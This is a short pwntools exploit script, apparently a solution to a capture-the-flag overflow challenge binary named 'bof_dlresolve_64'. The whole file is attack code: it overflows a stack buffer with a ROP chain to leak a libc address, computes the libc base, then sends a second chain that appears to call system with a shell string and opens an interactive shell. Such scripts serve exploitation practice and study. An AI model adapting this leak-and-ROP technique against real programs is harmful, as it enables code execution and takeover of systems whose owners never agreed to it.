from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/zeratool-challenges/overflow/bof_dlresolve_64")
pwn.gdb.attach(p)
#p.recvuntil(b'pwn_me:\nYour buffer is at 0x7fffffffffefef0\n')
p.recvuntil(b"\n")
p.recvuntil(b"\n")
payload = b"\x00" * 40
payload += p64(0x40101a) + p64(0x401303) + p64(0x4033f8) + p64(0x401080) + p64(0x4012fa) + p64(0x0) + p64(0x1) + p64(0x0) + p64(0x403c80) + p64(0x18) + p64(0x403438) + p64(0x4012e0) + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p64(0x40119d) + p64(0x403c78) + p64(0x40121e)
payload = payload.ljust(230, b"a")
p.send(payload)
libc_base = u64(p.recv()[0:6].ljust(8,b'\x00')) + -0x21ba0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p64(0x401303) + p64(libc_base + 0x1b3d88) + p64(libc_base + 0x4f420)
p.send(payload)
p.interactive()
